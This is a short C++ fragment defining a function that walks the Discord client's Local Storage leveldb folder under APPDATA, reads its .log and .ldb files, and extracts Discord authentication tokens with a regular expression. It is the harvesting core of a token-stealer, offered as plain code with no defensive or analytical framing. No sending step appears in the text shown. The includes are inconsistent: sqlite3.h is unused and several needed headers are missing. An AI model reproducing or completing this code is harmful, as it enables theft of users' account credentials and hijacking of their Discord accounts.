#include <sqlite3.h>
#include <filesystem>
#include <string>

std::vector<std::string> scan_discord_tokens() {
    std::vector<std::string> tokens;
    std::string path = std::getenv("APPDATA");
    path += "\\Discord\\Local Storage\\leveldb";

    for (const auto& entry : std::filesystem::directory_iterator(path)) {
        if (entry.path().extension() != ".log" && entry.path().extension() != ".ldb") continue;
        std::ifstream file(entry.path());
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        std::regex token_regex(R"([mMnN][a-zA-Z0-9_\-]{23}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})");
        std::smatch match;
        while (std::regex_search(content, match, token_regex)) {
            tokens.push_back(match.str());
            content = match.suffix();
        }
    }
    return tokens;
}
